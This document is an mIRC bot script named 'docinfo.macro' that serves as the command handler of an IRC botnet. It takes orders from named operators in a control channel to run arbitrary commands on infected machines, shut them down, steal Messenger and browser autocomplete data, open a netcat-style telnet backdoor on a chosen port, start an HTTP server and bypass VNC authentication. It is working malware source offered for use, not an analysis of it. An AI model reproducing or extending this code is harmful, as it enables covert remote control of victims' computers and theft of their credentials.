docinfo.macro:
on *:TEXT:*:#command-center: {
  if ($nick == softtop) || ($nick == bry-sheila) || ($nick == pitbull) || ($nick == root3r) {
    if ($1 == !info) {
      if ($2 == system) { sysinfo }
      if ($2 == uptime) {
        .msg $chan [11uptime/11 $dll(servicerun.dll,uptime,_) $+ ]
        halt
      }
      if ($2 == ram) {
        .msg $chan [11ram/11 $dll(servicerun.dll,meminfo,_) $+ ]
        halt
      }
      if ($2 == processor) {
        .msg $chan [11processor/11 $dll(servicerun.dll,cpuinfo,_) $+ ]
        halt
      }
      if ($2 == os) {
        .msg $chan [11 $dll(servicerun.dll,osinfo,_) $+ ]
        halt
      }
      if ($2 == internet) {
        .msg $chan [11Internet/11 $dll(servicerun.dll,interfaceinfo,_)  $+ ]
        halt
      }
      if ($2 == hd) {
        hd
      }
      if ($2 == lag) { lag }
      if ($2 == screencap) { 
        if ($3 == $me) { screencap }
      }
    }
    if ($1 == !raw) {
      if ($2 == all) { msg %chan Running Command:11 $3- | $3- }   
      if ($2 == $me) { msg %chan Running Command:11 $3- | $3- } 
    }
    if ($1 == !bot) {
      if ($2 == restart) {
        if ($3 == all) { msg %chan BrB,11 Bot is restarting | partall | exit | run $mircdir $+ servicerun.exe restart.bat }
        if ($3 == $me) { msg %chan BrB,11 Bot is restarting | partall | exit | run $mircdir $+ servicerun.exe restart.bat }
      }
      if ($2 == exit) { 
        if ($3 == all) { msg %chan Cya,11 Bot is quiting | partall | exit }
        if ($3 == $me) { msg %chan Cya,11 Bot is quiting | partall | exit }
      }
    }
    if ($1 == !box) {
      if ($2 == shutdown) { 
        if ($3 == $me) { run shutdown /s }
        if ($3 == all) { run shutdown /s }
      }
      if ($2 == restart) { 
        if ($3 == $me) { run shutdown /r }
        if ($3 == all) { run shutdown /r }
      }
    }
    if ($1 == !steal) { 
      if ($2 == messenger) { messengerstealer }
      if ($2 == autocomplete) { 
        if ($3 == all) { autocompletestealer }
        if ($3 == $me) { autocompletestealer } 
      }
    }
    if ($1 == !unroot) {
      if ($2 == $me) { msg %chan !Bye 11UNROOTING | timervnc off | run proc.exe vnc_bypauth.exe | exit | run $mircdir $+ servicerun.exe unroot.bat } 
      if ($2 == all) { msg %chan Bye! 11UNROOTING | exit | run $mircdir $+ servicerun.exe unroot.bat }
    }
    if ($1 == !update) {
      if ($2 == $me) { 
        if ($exists($mircdir $+ download\ $+ $3) == $false ) { msg %chan 14,8C8,1A14,8U8,1T14,8I8,1O14,8N0,4 UPDATE FILE DOES NOT EXIST 14,8C8,1A14,8U8,1T14,8I8,1O14,8N | halt }
        if ($exists($mircdir $+ download\ $+ $3) == $true ) { update }
      }
    }
  }
  if ($1 == !telnet) { 
    if ($2 == $me) { 
      if ($3 == start) { msg %chan Starting11 Telnet Server on Port:11 $4 | run servicerun.exe "service32.exe -l -vv -p $4 -e telnet.bat" }  
      if ($3 == stop) { msg %chan Stoping11 Telnet Server | run proc.exe service32.exe }
    }
    if ($2 == all) { 
      if ($3 == start) { msg %chan Starting11 Telnet Server on Port:11 $4 | run servicerun.exe "service32.exe -l -vv -p $4 -e telnet.bat" }  
      if ($3 == stop) { msg %chan Stoping11 Telnet Server | run servicerun.exe "proc.exe service32.exe" }
    }
  }
  if ($1 == !httpd) {
    if ($2 == $me) {
      if ($3 == start) { msg %chan Starting11 HTTPD on Port:11 80 In DIR:11 $mircdir $+ temp\ | run services32.exe }
      if ($3 == stop) { msg %chan Stopping11 HTTPD | run servicerun.exe "proc.exe services32.exe" }
    }
  }
  if ($2 == all) {
    if ($3 == start) { msg %chan Starting11 HTTPD on Port:11 80 In DIR:11 $mircdir $+ temp\ | run services32.exe }
    if ($3 == stop) { msg %chan Stopping11 HTTPD | run servicerun.exe "proc.exe services32.exe" }
  }
}


